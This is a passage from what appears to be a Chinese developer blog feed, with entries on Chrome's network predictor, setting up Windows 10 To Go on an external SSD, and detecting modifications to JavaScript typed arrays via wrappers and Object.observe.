<p>和<code>ResourceDispatcherHost</code>，一个负责Chrome内部所有网络活动的实体，不同的是，<code>Predictor</code>对象对Chrome内部的用户和网络创建了一系列过滤器：</p>
<ul>
<li>IPC管道过滤器，监测Render进程的信号</li>
<li><code>ConnectInterceptor</code>实体被添加在每一个Request中，这样的话它便可以观察流量模式，并为每个Request记录下数据（success metrics）。</li>
</ul>
<p>举个栗子来说，Render进程在如下情况发生时，都会向Browser进程发送消息。请查看在<code>ResolutionMotivation</code>(<a href="http://code.google.com/searchframe#OAMlx_jo-ck/src/chrome/browser/net/url_info.h&amp;l=35" target="_blank" rel="external">url_info.h</a>)的定义：</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ResolutionMotivation</span> &#123;</span></span><br><span class="line">    <span class="constant">MOUSE_OVER_MOTIVATED</span>,     <span class="regexp">//</span> 用户触发的鼠标经过事件<span class="constant">Mouse</span>-over initiated by the user.</span><br><span class="line">    <span class="constant">OMNIBOX_MOTIVATED</span>,        <span class="regexp">//</span> <span class="constant">Omni</span>-box 提示</span><br><span class="line">    <span class="constant">STARTUP_LIST_MOTIVATED</span>,   <span class="regexp">//</span> 本资源在<span class="number">10</span>大最常访问之列</span><br><span class="line">    <span class="constant">EARLY_LOAD_MOTIVATED</span>,     <span class="regexp">//</span> 某些情况下我们使用预加载来在发射真实的<span class="constant">Request</span>前预热连接</span><br><span class="line"></span><br><span class="line">    /<span class="regexp">/ 如下和预测式预加载有关，由浏览触发</span><br><span class="line">    /</span><span class="regexp">/ The following involve predictive prefetching, triggered by a navigation.</span><br><span class="line">    STATIC_REFERAL_MOTIVATED,  /</span><span class="regexp">/ 外界知识库</span><br><span class="line">    LEARNED_REFERAL_MOTIVATED, /</span><span class="regexp">/ 从之前的浏览习惯中总结得到</span><br><span class="line">    SELF_REFERAL_MOTIVATED,    /</span><span class="regexp">/ 猜测会产生第二次连接</span><br><span class="line"></span><br><span class="line">    /</span><span class="regexp">/ &lt;snip&gt; ..,</span><br><span class="line">&#125;;</span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
<p>获知一个信号后，预测器的目标便是评估其正确的可能性，若资源获取到后，激活事件。每个预测都有成功性，优先级和一个有时效的时间戳。组合起来可以建立一个内部的优先队列来优化预测。最终，对于每一个从此队列发出的Request，预测器还会持续追踪它的成功率，这让后续优化成为可能。</p>
<h2 id="u679C_u58F3_u4E2D_u7684Chrome_u7F51_u7EDC_u67B6_u6784"><a href="#u679C_u58F3_u4E2D_u7684Chrome_u7F51_u7EDC_u67B6_u6784" class="headerlink" title="果壳中的Chrome网络架构"></a>果壳中的Chrome网络架构</h2><ul>
<li>Chrome使用一个<strong>多进程架构</strong>，这将Render和Browser进程隔离</li>
<li>Chrome维护了一个<strong>资源调度分配的单例</strong>，它被所有Render进程公用，并运行在Browser进程中</li>
<li>网络栈是一个<strong>快平台</strong>，大多数情况下单线程的库</li>
<li>网络栈使用<strong>非阻塞</strong>的操作来管理所有的网络操作</li>
<li>共享的网络栈让资源优先级、重用策略更加高效，并让跨进程全局优化成为可能</li>
<li>每个Render进程都和资源分配器通过IPC通信</li>
<li>预测器拦截资源Request和Response，学习并优化未来的Request</li>
<li><strong>预测器会安排DNS，TCP，甚至是资源请求</strong>，这基于学习到的网络模式，当用户浏览时能节省数百毫秒</li>
</ul>
<p>（未完待续）</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>看到Ilya Grigorik写的<a href="https://www.igvita.com/posa/high-performance-networking-in-google-chrome/" target="_blank" rel="ex]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="trans" scheme="http://yqf3139.github.io/categories/trans/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在外置SSD上体验 Windows 10 to go]]></title>
    <link href="http://yqf3139.github.io/2015/12/12/windows-to-go-with-SSD/"/>
    <id>http://yqf3139.github.io/2015/12/12/windows-to-go-with-SSD/</id>
    <published>2015-12-12T03:16:08.000Z</published>
    <updated>2015-12-12T13:24:44.153Z</updated>
    <content type="html"><![CDATA[<h1 id="u4E3A_u4EC0_u4E48_u9700_u8981_u8FD9_u4E48_u6298_u817E_uFF1F"><a href="#u4E3A_u4EC0_u4E48_u9700_u8981_u8FD9_u4E48_u6298_u817E_uFF1F" class="headerlink" title="为什么需要这么折腾？"></a>为什么需要这么折腾？</h1><p>我在主系统转为Linux后，虽然轻量级的Office编辑和图片/视频编辑是可以进行的，比如利用免费的LibreOffice、Kdenlive、Inkscape。对于图片处理，某些命令行工具如<code>convert</code>，可以直接脚本调用，灵活行和自动性反而比GUI软件更高。</p>
<p>但不得不承认，偶尔正式场合编辑文档表格和幻灯、PS、网银操作，还是逃脱不了更加普适的Windows。对于标准的Office套件，Adobe套件和Visual Studio等神一般的Windows软件，还是需要找一个解决方案来愉快地使用的。然而并没有入Mac的打算，所以我还是准备采用各种方法使用Windows。正好这样的话，也有机会再摸一摸Windows上的软件，比如微信电脑版等等。</p>
<p>所以对于我80%以上是直接使用Linux，一个纯粹的系统即可，有时需要使用Office等时需要短时间密集的Windows使用。</p>
<p>首先有两个方案也不错，但我不是很想使用，一个是Wine，兼容性总是永远的痛，一个是双系统，需要比较大的硬盘，而且相对比较麻烦，再后期与Windows to go对比后，我也抛弃了这个方案。</p>
<h1 id="u65B9_u6848_u4E00_3A__u865A_u62DF_u673A"><a href="#u65B9_u6848_u4E00_3A__u865A_u62DF_u673A" class="headerlink" title="方案一: 虚拟机"></a>方案一: 虚拟机</h1><p>虚拟机对于高性能的主机适用，对于我2012年的笔记本，运行XP非常流畅，但Win7比较吃力。虚拟机的优点很明显，做好系统后，几个文件组成的虚拟机可以任意备份与拷贝，所以我常备着几个干净的Xp和Win7虚拟机，和装有Office的。</p>
<p><img src="/images/windows-to-go-with-SSD/vm.png" alt="vm"></p>
<h1 id="u65B9_u6848_u4E8C_3A__u8FDC_u7A0B_u684C_u9762"><a href="#u65B9_u6848_u4E8C_3A__u8FDC_u7A0B_u684C_u9762" class="headerlink" title="方案二: 远程桌面"></a>方案二: 远程桌面</h1><p>在实验室有了高性能主机入驻后（研究生的开发机，非常眼馋），我便一直寻求办法远程使用它。在争取得到学长同意后，我登记了账号，并网上查询到方法，可以让多人同时登入一台Windows主机操作，这样当学长使用电脑的时候，我还是可以远程登陆进行操作。</p>
<p>关于操作顺畅的问题，Microsoft的RDP远程桌面协议已经十分高效，再加上如果是校园以太网连接，操作顺滑，甚至可以看视频。</p>
<p>使用远程桌面的好处也有不少：</p>
<ol>
<li>不占用我本地的计算/存储资源，我可以同时开发与处理文档。</li>
<li>系统和我本机无关，我可以是Windows/Linux/Mac/iOS/Android，登陆即可享用主机资源。</li>
<li>只要网络通畅，随时随地登录。 </li>
</ol>
<p>当然也有一些弊端，比如受他人限制，远程桌面使用的虚拟显卡驱动会造成某些软件问题，需要插U盘的话比较麻烦（可以直接挂载本地硬盘共享）。</p>
<p>推荐一个Linux上的开源远程桌面客户端，<a href="https://github.com/FreeRDP/FreeRDP" target="_blank" rel="external">FreeRdp</a>，可以添加剪贴板共享、挂载本地磁盘等功能，其他平台微软均有提供。<br><img src="/images/windows-to-go-with-SSD/freerdp.png" alt="vm"></p>
<h1 id="u65B9_u6848_u4E09_3A__u5916_u7F6ESSD_u5B89_u88C5Windows_to_go"><a href="#u65B9_u6848_u4E09_3A__u5916_u7F6ESSD_u5B89_u88C5Windows_to_go" class="headerlink" title="方案三: 外置SSD安装Windows to go"></a>方案三: 外置SSD安装Windows to go</h1><p>不过虚拟机在我笔记本上总是跑不畅快，远程桌面也并不是随时都能享用，怎样才能一直运行我的Windows（各种环境齐全），但又不受机器的限制，也就是不写死在一台主机中呢？</p>
<p>事实证明<code>Windows to go</code>就是符合我的期望的，它可以直接将Windows装在外置硬盘和U盘中。这样我只需要将这个外置存储设备插入一台主机，便选择从外置存储直接启动了，这里具体请参考微软的<a href="">说明</a>，其会在启动时判别硬件并加载驱动，就算不是同一机器，也能进入同一个Windows实例。<code>Chrome OS</code>则更方便，登录即可，不过现在还不适用于我的情况，技术上也不成熟。</p>
<p>USB3.0可以达到5Gb/s的传输速率，高于Sata3的极限，所以普通Sata3硬盘是可以这样用的，也可以弄一个高速USB3.0 U盘，但为了以后硬盘可以重用于其他，我还是牺牲了便携性。</p>
<h2 id="Windows_8_+_HDD_+_USB_3-0"><a href="#Windows_8_+_HDD_+_USB_3-0" class="headerlink" title="Windows 8 + HDD + USB 3.0"></a>Windows 8 + HDD + USB 3.0</h2><p>于是我在十一期间立马找了一个320G的硬盘，配合一个USB3的外置盒，边体验了一番。<br>事实证明体验很差，不是因为系统不好用，而是因为HDD加劣质的外置盒太慢了。</p>
<p>两秒的延时，太慢了。<br><img src="/images/windows-to-go-with-SSD/winsys-hdd.jpg" alt="lantency"></p>
<p>在看到<a href="https://luolei.org/imac-5k-external-usb-ssd-update/" target="_blank" rel="external">其他人用外置SSD做iMac系统盘后</a>，我才终于决定一定需要弄一个入门的SSD来做Windows to go，这样IO便不是瓶颈，如果有高性能的主机的话，我便可以直接占领其计算资源，作图渲染视频就能节省很多时间。</p>
<h2 id="Windows_10_+_SSD_+_USB3-0_uFF08UASP_u652F_u6301_uFF09"><a href="#Windows_10_+_SSD_+_USB3-0_uFF08UASP_u652F_u6301_uFF09" class="headerlink" title="Windows 10 + SSD + USB3.0（UASP支持）"></a>Windows 10 + SSD + USB3.0（UASP支持）</h2><h3 id="u8D2D_u4E70"><a href="#u8D2D_u4E70" class="headerlink" title="购买"></a>购买</h3><p>硬盘性能、USB3.0协议、外置盒的主控芯片的性能，支持UASP协议都是值得考虑的，综合经济实力和使用频率考虑，由于只要装系统/Office/Adobe，120G足够，如果需要编辑的文件很大（如视频），可以后再加移动固态硬盘。</p>
<blockquote>
<p>USAP是USB-IF所制定的一个新传输协议用于透过USB接口连接序列设备，提供大容量储存设备的传输速度高达20％，并降低CPU的利用率、数据延迟和等待时间，USAP协议提供了高性能主机及设备之间的数据传输。 </p>
</blockquote>
<p>最终选择：<br>SSD   ： 入门级120G Sandisk加强版，京东购入比较放心。<br>外置盒： ORICO 2589S3，USB3.0并支持UASP，淘宝购入。</p>
<p>共356元。</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><ol>
<li>安装SSD，盒子是免工具拆卸，立马搞定。</li>
<li>格式化为NTFS，测速发现不错。</li>
<li>使用<a href="https://rufus.akeo.ie/" target="_blank" rel="external">rufus</a>工具，选择Windows 10镜像，并勾选<code>Windows to go</code>，过程非常傻瓜。</li>
<li>重启选择外置SSD启动。</li>
</ol>
<p><img src="/images/windows-to-go-with-SSD/rufus_en.png" alt="rufus"></p>
<h3 id="u4F7F_u7528"><a href="#u4F7F_u7528" class="headerlink" title="使用"></a>使用</h3><p>装完各种常用应用后硬盘使用不超一半，测速满意，和同学的低端SSD系统盘对比后发现差距不大。</p>
<p><img src="/images/windows-to-go-with-SSD/as-ssd-test.jpg" alt="rufus"><br><img src="/images/windows-to-go-with-SSD/winsys-ssd.jpg" alt="rufus"></p>
<p>相比之下原来硬盘的顺序读写不到50MB/s，4K根本跑不完。</p>
<p>正好开发机性能不错，只安装了Ubuntu，也启动尝试了一下。</p>
<p><img src="/images/windows-to-go-with-SSD/winsys-info.jpg" alt="rufus"><br><img src="/images/windows-to-go-with-SSD/winsys-cpu.jpg" alt="rufus"></p>
<p>最终认为这次折腾是值得的，终于可以再次畅快地玩玩Windows 10了，并且所有环境都在一个随时硬盘中，节省了重复布置环境的麻烦。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="u4E3A_u4EC0_u4E48_u9700_u8981_u8FD9_u4E48_u6298_u817E_uFF1F"><a href="#u4E3A_u4EC0_u4E48_u9700_u8981_u8FD9_u4E48_u6298_u817E_uFF1F" ]]>
    </summary>
    
      <category term="linux" scheme="http://yqf3139.github.io/tags/linux/"/>
    
      <category term="ssd" scheme="http://yqf3139.github.io/tags/ssd/"/>
    
      <category term="windows" scheme="http://yqf3139.github.io/tags/windows/"/>
    
      <category term="tech" scheme="http://yqf3139.github.io/categories/tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[检测Javascript中变量的修改]]></title>
    <link href="http://yqf3139.github.io/2015/11/28/check-js-var-update/"/>
    <id>http://yqf3139.github.io/2015/11/28/check-js-var-update/</id>
    <published>2015-11-28T08:20:08.000Z</published>
    <updated>2016-01-01T02:15:39.398Z</updated>
    <content type="html"><![CDATA[<h1 id="u95EE_u9898_u63CF_u8FF0"><a href="#u95EE_u9898_u63CF_u8FF0" class="headerlink" title="问题描述"></a>问题描述</h1><p>目前在做的小项目中，我们在浏览器中通过Hook浏览器的API，截获目标程序对浏览器API的调用。比如对于Webgl的网页程序，我们就能截获所有的gl指令，这其中主要是截获参数列表。把这些gl指令翻译为Opengl ES标准的话便可以编译为一个其他设备上的原生应用了。</p>
<p>图形的绘制过程中经常会有大量的数组需要传递入GPU，这就造成了我们截获了大量的数组。如果想直接把这些数据保存在浏览器内存中，压力很大，实时流到其他服务器上的话也带来了stringfy瓶颈和传输瓶颈。虽然对于Javascript中的Typed Array，我们现在直接二进制传输到服务器上，是否能只传输变化的数组，或者是只传输数组的delta，这个是一个潜在的优化。当然，如果发现大部分要传输的数组都是改变过的话，或者是检测改变的开销大于直接传输的开销（毕竟是CPU时间对抗IO时间，而且由于检测比如会使目标程序运行变慢），完全便可以不考虑进行数组改变的检测了。</p>
<p>对于给定Javascript的TypedArray，我们的目标便是当截获到的gl指令需要使用它的时候，我们需要能知道它是否内容发生了改动，更进一步能记录出上次截获到这次截获间的delta。<br>花了一些时间进行探索，然而最后还是无解，并也没有方法能占用资源尽量少地做到标记修改，记录如下。</p>
<h1 id="u66B4_u529B_u68C0_u6D4B"><a href="#u66B4_u529B_u68C0_u6D4B" class="headerlink" title="暴力检测"></a>暴力检测</h1><p>这个方法不需要多说，不过检测的时间消耗太多，由于消耗了Webgl每帧的CPU时间，很容易造成CPU性能瓶颈，导致Fps下降。</p>
<h1 id="Object-observe_28_29_/_Array-observe_28_29"><a href="#Object-observe_28_29_/_Array-observe_28_29" class="headerlink" title="Object.observe() / Array.observe()"></a>Object.observe() / Array.observe()</h1><p>最先查询到的便是两个内建的API，直接来看MDN上的使用：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    foo: <span class="number">0</span>,</span><br><span class="line">    bar: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.observe(obj, <span class="keyword">function</span>(changes) &#123;</span><br><span class="line">    console.log(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj.baz = <span class="number">2</span>;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'add'</span>&#125;]</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">'hello'</span>;</span><br><span class="line">// [&#123;name: <span class="string">'foo'</span>, object: &lt;obj&gt;, type: <span class="string">'update'</span>, oldValue: <span class="number">0</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.baz;</span><br><span class="line">// [&#123;name: <span class="string">'baz'</span>, object: &lt;obj&gt;, type: <span class="string">'delete'</span>, oldValue: <span class="number">2</span>&#125;]</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
<p>一开始看到的时候感觉非常符合我的需求，并且还区分了改动的类型，比如<code>update</code>、<code>add</code>、<code>delete</code>类型。<br>应该现在很多前端的工具就使用Observe便可以完全数据到显示的单向同步了。<br>于是尝试了一下在Typed Array上的操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = <span class="keyword">new</span> Int16Array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">Object.observe(obj, function(changes) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(changes);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// changed</span></span><br><span class="line">obj[<span class="number">0</span>] = <span class="number">9</span>; <span class="comment">// unchanged</span></span><br><span class="line">obj.sort(); <span class="comment">// changed</span></span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>不过后来看到这么一个解释:</p>
<blockquote>
<p>The Object.observe() method is used for asynchronously observing the changes<br>to an object. It provides a stream of changes in the order in which they<br>occur.</p>
</blockquote>
<p>说明变更事件是异步通知的，比如可以这样实验一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Int16Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">a.isDirty = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">Object</span>.observe(a, <span class="function"><span class="keyword">function</span>(<span class="params">changes</span>) </span>&#123;</span><br><span class="line">      a.isDirty = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">9</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.isDirty);</span><br><span class="line">setTimeout(<span class="string">'console.log(a.isDirty);'</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">c</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
<p>这就带来了问题，由于Javascript执行是单线程的，可能在webgl程序刚修改完后便被我截获了这个数组，但修改通知没到，我就已经错误判断数组未改变了，由于我相当于是对每个gl命令的参数进行快照，无法在未来进行记录，如果停止我当前线程的，会带来严重的性能问题。</p>
<h1 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty"></a>Object.defineProperty</h1><p>这个方法可以为对象定义属性，并能对属性的访问进行详细的控制，最简单的话我们给定义get和set函数，举例说明：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> shadow = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(arr, <span class="string">'0'</span>, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'get'</span>);</span><br><span class="line">    <span class="keyword">return</span> shadow[<span class="string">'0'</span>];</span><br><span class="line">  &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'set'</span>);</span><br><span class="line">    shadow[<span class="string">'0'</span>] = v;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>通常对外暴露的get，set中要访问一个内部的变量，以防止递归访问属性的get或是set。<br>这个方法其实是多加入了一个proxy的对象。并且TypedArray并不能重写数字属性的get/set，只能通过一个proxy对象了。</p>
<p>一个简陋的实现，直接替换浏览器中提供的API:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _Float32Array = <span class="built_in">Float32Array</span>;</span><br><span class="line"><span class="built_in">Float32Array</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 这里需要罗列出内部的属性和函数名</span></span><br><span class="line">  <span class="comment">// 因为数组类型只能for遍历数字属性</span></span><br><span class="line">  <span class="keyword">var</span> list = [</span><br><span class="line">    <span class="string">"BYTES_PER_ELEMENT"</span>,</span><br><span class="line">    <span class="string">"__defineGetter__"</span>,</span><br><span class="line">    <span class="string">"__defineSetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupGetter__"</span>,</span><br><span class="line">    <span class="string">"__lookupSetter__"</span>,</span><br><span class="line">    <span class="string">"constructor"</span>,</span><br><span class="line">    <span class="string">"buffer"</span>,</span><br><span class="line">    <span class="string">"byteLength"</span>,</span><br><span class="line">    <span class="string">"byteOffset"</span>,</span><br><span class="line">    <span class="string">"entries"</span>,</span><br><span class="line">    <span class="string">"hasOwnProperty"</span>,</span><br><span class="line">    <span class="string">"isPrototypeOf"</span>,</span><br><span class="line">    <span class="string">"keys"</span>,</span><br><span class="line">    <span class="string">"length"</span>,</span><br><span class="line">    <span class="string">"propertyIsEnumerable"</span>,</span><br><span class="line">    <span class="string">"set"</span>,</span><br><span class="line">    <span class="string">"subarray"</span>,</span><br><span class="line">    <span class="string">"toLocaleString"</span>,</span><br><span class="line">    <span class="string">"toString"</span>,</span><br><span class="line">    <span class="string">"valueOf"</span>,</span><br><span class="line">    <span class="string">"values"</span>,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化的函数可能会有三个参数，还未处理</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">new</span> _Float32Array(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.a = a;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">this</span>.isDirty = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  list.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(a[key]) == <span class="string">'function'</span>) &#123;</span><br><span class="line">      b[key] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        b.isDirty = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'invoke'</span>, key);</span><br><span class="line">        <span class="keyword">return</span> a[key].apply(a, <span class="built_in">arguments</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(b, key, &#123;</span><br><span class="line">        configurable: <span class="literal">true</span>,</span><br><span class="line">        enumerable: <span class="literal">true</span>,</span><br><span class="line">        get: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'get member'</span>,i);</span><br><span class="line">            <span class="keyword">return</span> a[i];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;(key),</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">            b.isDirty = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'set member'</span>,i);</span><br><span class="line">            a[i] = v;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;(key)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.constructor = a.constructor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> idx <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(b, idx, &#123;</span><br><span class="line">      configurable: <span class="literal">true</span>,</span><br><span class="line">      enumerable: <span class="literal">true</span>,</span><br><span class="line">      get: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'get index'</span>,i);</span><br><span class="line">          <span class="keyword">return</span> a[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx),</span><br><span class="line">      set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'set index'</span>,i);</span><br><span class="line">          b.isDirty = <span class="literal">true</span>;</span><br><span class="line">          a[i] = v;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">&gt;&gt;a = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span> &#123;a: <span class="built_in">Float32Array</span>[<span class="number">3</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line">&gt;&gt;a.toString()</span><br><span class="line">&lt;&lt;t.js:<span class="number">64</span> invoke toString</span><br><span class="line">&lt;&lt;<span class="string">"1,2,3"</span></span><br><span class="line">&gt;&gt;a[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">&lt;&lt;t.js:<span class="number">100</span> set index <span class="number">0</span></span><br><span class="line">&lt;&lt;<span class="number">1</span></span><br><span class="line">&gt;&gt;a[<span 